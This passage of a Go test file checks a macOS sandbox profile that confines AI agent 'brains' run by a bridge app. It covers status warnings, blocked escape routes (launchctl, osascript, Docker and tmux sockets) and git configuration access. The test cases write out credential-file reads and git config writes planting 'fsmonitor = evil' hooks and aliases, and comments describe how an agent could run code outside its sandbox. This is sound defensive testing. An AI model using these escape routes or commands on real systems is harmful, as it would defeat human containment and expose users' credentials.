		t.Fatalf("the store did not create %s: %v", cfg.DBPath, err)
	}
	return mgr.profiler, mgr.Get("a").Dir()
}

// sandboxTry reads (cat) or writes (sh) path as brain a under its profile,
// from a's folder like a real run. Anything other than success or the
// sandbox's "Operation not permitted" fails the test, so a missing file can
// never pass as denied, and neither can sandbox-exec failing to apply the
// profile (its own errors start with "sandbox-exec:").
func sandboxTry(t *testing.T, sp *SandboxProfiler, dir string, write bool, path string) (bool, string) {
	t.Helper()
	if write {
		return sandboxRun(t, sp, dir, "/bin/sh", "-c", `printf planted > "$1"`, "sh", path)
	}
	return sandboxRun(t, sp, dir, "/bin/cat", path)
}

// sandboxRun runs prog with args as brain a under its profile, from dir,
// and reports whether it succeeded; see sandboxTry.
func sandboxRun(t *testing.T, sp *SandboxProfiler, dir, prog string, args ...string) (bool, string) {
	t.Helper()
	env := sandboxStateEnv(t, sp, "a")
	bin, argv, err := sp.Command("a", prog, args)
	if err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command(bin, argv...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), env...)
	out, err := cmd.CombinedOutput()
	switch {
	case err == nil:
		return true, string(out)
	case strings.Contains(string(out), "Operation not permitted") && !strings.HasPrefix(string(out), "sandbox-exec:"):
		return false, string(out)
	}
	t.Fatalf("%s %q: %v: %s", prog, args, err, out)
	return false, ""
}

// sandboxStateEnv creates brain id's state as a run does, with the folders
// sp's profiles name, and returns what the run adds to its environment.
func sandboxStateEnv(t *testing.T, sp *SandboxProfiler, id string) []string {
	t.Helper()
	env, err := sandboxState(sp, id)
	if err != nil {
		t.Fatal(err)
	}
	return env
}

// sandboxState is prepareBrainState for brain id with sp's settings.
func sandboxState(sp *SandboxProfiler, id string) ([]string, error) {
	sp.mu.RLock()
	data, media, inherit := sp.dataDir, sp.mediaDir, sp.inheritUser
	sp.mu.RUnlock()
	return prepareBrainState(data, media, id, inherit)
}

// resolvedForTest is the real path of p, resolving symlinks in its existing
// part (a file a check writes does not exist yet).
func resolvedForTest(t *testing.T, p string) string {
	t.Helper()
	dir, base := filepath.Split(p)
	real, err := filepath.EvalSymlinks(dir)
	if err != nil {
		t.Fatal(err)
	}
	return filepath.Join(real, base)
}

// TestStatusWarnsWhenSandboxDoesNotApply: the dashboard's Sandbox card says
// "On" from the config alone, so the status warns when runs are refused for
// a missing sandbox-exec or a profile that cannot be built.
func TestStatusWarnsWhenSandboxDoesNotApply(t *testing.T) {
	a := BrainManifest{ID: "a", Name: "A", Routing: BrainRouting{HandlesDMs: true}}
	b := BrainManifest{ID: "b", Name: "B", Routing: BrainRouting{Groups: []string{"120363000000000000@g.us"}}}
	cases := []struct {
		name      string
		atHome    bool // brain a's folder is the home folder, and there is no b
		breakIt   func(sp *SandboxProfiler)
		needsExec bool   // the case expects sandbox-exec to work
		want      string // "" for no sandbox warning
	}{
		{"working sandbox", false, nil, true, ""},
		{"sandbox-exec missing", false,
			func(sp *SandboxProfiler) { sp.execPath = "/nonexistent/sandbox-exec" }, false, "cannot run"},
		// b's folder is in a's profile too, so both brains are refused.
		{"brain folder the profile cannot hold", false,
			func(sp *SandboxProfiler) { sp.workDirs["b"] = []string{sp.workDirs["b"][0] + "\nx"} }, true, "line break), so brains a, b refuse every message"},
		// config.json accepts a brain at ~, which the dashboard refuses.
		{"brain folder at the home folder", true, nil, true, "is your home folder or holds it"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if tc.needsExec {
				requireSandboxExec(t)
			}
			// Brains can log in; see TestStatusWarnsWhenBrainsCannotLogIn.
			t.Setenv("CLAUDE_CODE_OAUTH_TOKEN", "test-token")
			tb := newTestBridge(t, `, "sandbox": {"enabled": true}`)
			if tc.atHome {
				ref := brainFolder(t, "~", a)
				if _, err := tb.cfgs.Update("", func(c *Config) error {
					c.BrainDirs = append(c.BrainDirs, ref)
					return nil
				}); err != nil {
					t.Fatal(err)
				}
			} else {
				tb.addFolderBrain(t, a)
				tb.addFolderBrain(t, b)
			}
			if tc.breakIt != nil {
				sp := tb.brainMgr.profiler
				sp.mu.Lock()
				tc.breakIt(sp)
				sp.mu.Unlock()
			}
			w := tb.do("GET", "/api/status", nil)
			var st statusResponse
			if err := json.Unmarshal(w.Body.Bytes(), &st); err != nil {
				t.Fatal(err)
			}
			var got []string
			for _, warning := range st.Warnings {
				if strings.Contains(strings.ToLower(warning), "sandbox") {
					got = append(got, warning)
				}
			}
			switch {
			case tc.want == "" && len(got) > 0:
				t.Errorf("unexpected sandbox warnings: %q", got)
			case tc.want != "" && (len(got) != 1 || !strings.Contains(got[0], tc.want)):
				t.Errorf("sandbox warnings = %q, want one containing %q", got, tc.want)
			}
		})
	}
}

// TestStatusWarnsWhenBrainsCannotLogIn: a sandboxed brain has a Claude Code
// config dir of its own, so the login you made with `claude` (in your
// keychain and config dir) does not reach it. Without a token in the
// bridge's environment every brain fails with "Not logged in", so the
// status says so.
func TestStatusWarnsWhenBrainsCannotLogIn(t *testing.T) {
	cases := []struct {
		name, sandbox string
		env           map[string]string
		want          bool
	}{
		{"sandboxed, no token", `true`, nil, true},
		{"sandboxed, OAuth token", `true`, map[string]string{"CLAUDE_CODE_OAUTH_TOKEN": "t"}, false},
		{"sandboxed, API key", `true`, map[string]string{"ANTHROPIC_API_KEY": "k"}, false},
		{"sandboxed, Bedrock", `true`, map[string]string{"CLAUDE_CODE_USE_BEDROCK": "1"}, false},
		{"not sandboxed", `false`, nil, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			for _, name := range brainLoginVars {
				t.Setenv(name, tc.env[name])
			}
			tb := newTestBridge(t, `, "sandbox": {"enabled": `+tc.sandbox+`}`)
			var st statusResponse
			if err := json.Unmarshal(tb.do("GET", "/api/status", nil).Body.Bytes(), &st); err != nil {
				t.Fatal(err)
			}
			got := strings.Contains(strings.Join(st.Warnings, "\n"), "claude setup-token")
			if got != tc.want {
				t.Errorf("warns about the login = %v, want %v (warnings %q)", got, tc.want, st.Warnings)
			}
		})
	}
}

// TestSandboxStopsStartingCodeOutsideIt: a brain could hand a command to
// something that runs it outside the sandbox: launchd (launchctl submit),
// another app (osascript telling Terminal to do script), a Docker daemon
// (docker run -v ~:/h) or a tmux server (tmux run-shell), the activity
// viewer's or your own. Under the real sandbox-exec it can run neither
// launchctl nor osascript, and connect to no unix socket in your home
// folder, your temp folder or tmux's, except its own in its folder and
// state, where the CLI keeps one. Each holds where your home folder is not
// in your temp folder either, as under launchd, whose TMPDIR is
// /var/folders/…: a test HOME in the temp folder would let that folder's
// deny hide a missing one for HOME. Apple events and LaunchServices opens
// are denied in the profile too, but not tried here: either would act on
// your desktop if the deny failed.
func TestSandboxStopsStartingCodeOutsideIt(t *testing.T) {
	requireSandboxExec(t)
	layouts := []struct {
		name   string
		tmpDir string // the bridge's TMPDIR, relative to the test's folder that holds HOME
	}{
		{"your home folder in your temp folder", "."},
		{"your temp folder outside your home folder, as under launchd", "tmp"},
	}
	for _, l := range layouts {
		t.Run(l.name, func(t *testing.T) {
			base := canonicalDir(t.TempDir())
			home := filepath.Join(base, "home")
			tmp := filepath.Join(base, l.tmpDir)
			for _, dir := range []string{home, tmp} {
				if err := os.MkdirAll(dir, 0o700); err != nil {
					t.Fatal(err)
				}
			}
			t.Setenv("HOME", home)
			t.Setenv("TMPDIR", tmp)
			t.Setenv("TMUX_TMPDIR", filepath.Join(home, "tmuxdir"))
			sp, own := sandboxFixture(t, home, "b", "clients")
			// Unix socket paths are short, so the servers listen, and the
			// brain connects, by paths relative to HOME and to its folder.
			t.Chdir(home)
			tmpRel, err := filepath.Rel(home, tmp)
			if err != nil {
				t.Fatal(err)
			}
			uid := fmt.Sprint(os.Getuid())
			sockets := map[string]string{
				"docker": ".docker/run/docker.sock",
				"tmux":   "tmuxdir/tmux-" + uid + "/default",
				"temp":   filepath.Join(tmpRel, "editor.sock"),
				"own":    "assistant/a/s.sock",
				"state":  ".fridolin/brains/a/tmp/cc.sock",
			}
			sandboxStateEnv(t, sp, "a") // creates the state folders
			for _, rel := range sockets {
				if err := os.MkdirAll(filepath.Dir(rel), 0o700); err != nil {
					t.Fatal(err)
				}
				ln, err := net.Listen("unix", rel)
				if err != nil {
					t.Fatal(err)
				}
				t.Cleanup(func() { ln.Close() })
				go func() {
					for {
						c, err := ln.Accept()
						if err != nil {
							return
						}
						c.Close()
					}
				}()
			}
			fromOwn := func(rel string) string { return filepath.Join("../..", rel) }
			cases := []struct {
				name    string
				cmd     string // runs in sh, or
				connect string // the socket this test binary connects to
				allow   bool
			}{
				{"run launchctl", `/bin/launchctl managerpid`, "", false},
				{"run osascript", `/usr/bin/osascript -e 'return 1'`, "", false},
				{"run a program", `/bin/echo ok`, "", true},
				{"connect to Docker in your home folder", "", fromOwn(sockets["docker"]), false},
				{"connect to a tmux server", "", fromOwn(sockets["tmux"]), false},
				{"connect to a socket in your temp folder", "", fromOwn(sockets["temp"]), false},
				{"connect to a socket in its own folder", "", "s.sock", true},
				{"connect to a socket in its state", "", fromOwn(sockets["state"]), true},
			}
			for _, c := range cases {
				t.Run(c.name, func(t *testing.T) {
					var allowed bool
					var out string
					if c.cmd != "" {
						allowed, out = sandboxRun(t, sp, own, "/bin/sh", "-c", c.cmd)
					} else {
						t.Setenv("FRIDOLIN_FAKE_CONNECT", c.connect)
						allowed, out = sandboxRun(t, sp, own, os.Args[0])
					}
					if allowed != c.allow {
						t.Errorf("%s%s: allowed=%v, want %v (output %q)", c.cmd, c.connect, allowed, c.allow, out)
					}
				})
			}
			profile := mustProfile(t, sp, "a")
			for _, rule := range []string{"(deny appleevent-send)", "(deny lsopen)", `(deny process-exec (literal "/usr/bin/open"))`} {
				if !strings.Contains(profile, rule) {
					t.Errorf("profile lacks %s", rule)
				}
			}
		})
	}
}

// TestSandboxGitConfig: under the real sandbox-exec, in both git_config
// modes a brain cannot write your git configuration, an included file
// named with an inline comment and ~/.config/git included, where
// core.fsmonitor or an alias would run in your own git; "deny" used to
// leave them writable. "deny" hides them, "read" lets a brain read them to
// commit in its own folder. git's credential files stay unreadable in both.
func TestSandboxGitConfig(t *testing.T) {
	requireSandboxExec(t)
	cases := []struct {
		name, cmd string // cmd runs in sh with $HOME set
		read      bool   // allowed with git_config "read"; never with "deny"
	}{
		{"read ~/.gitconfig", `cat "$HOME/.gitconfig"`, true},
		{"read an included file", `cat "$HOME/.gitconfig-extra"`, true},
		{"read ~/.config/git/config", `cat "$HOME/.config/git/config"`, true},
		{"read ~/.config/git/credentials", `cat "$HOME/.config/git/credentials"`, false},
		{"read ~/.git-credentials", `cat "$HOME/.git-credentials"`, false},
		{"write ~/.gitconfig", `printf '[core]\n\tfsmonitor = evil\n' >> "$HOME/.gitconfig"`, false},
		{"write an included file", `printf '[alias]\n\tst = !evil\n' >> "$HOME/.gitconfig-extra"`, false},
		{"write ~/.config/git/config", `printf '[core]\n\tfsmonitor = evil\n' >> "$HOME/.config/git/config"`, false},
	}
	for _, mode := range []string{"read", "deny"} {
		t.Run(mode, func(t *testing.T) {
			home := canonicalDir(t.TempDir())
			t.Setenv("HOME", home)
			sp, own := sandboxFixture(t, home, "b", "clients", map[string]any{"sandbox": map[string]any{"enabled": true, "git_config": mode}})
			for name, content := range map[string]string{
				".gitconfig":              "[include]\n\tpath = .gitconfig-extra ; local settings\n",
				".gitconfig-extra":        "[user]\n\tname = You\n",
				".config/git/config":      "[user]\n\temail = you@example.com\n",
				".config/git/credentials": "https://you:secret@example.com\n",
				".git-credentials":        "https://you:secret@example.com\n",
			} {
				writeTestFile(t, filepath.Join(home, name), content)
			}
			for _, c := range cases {
				t.Run(c.name, func(t *testing.T) {
					want := c.read && mode == "read"
					if allowed, out := sandboxRun(t, sp, own, "/bin/sh", "-c", c.cmd); allowed != want {
						t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, want, out)
					}
				})
			}
		})
	}
}
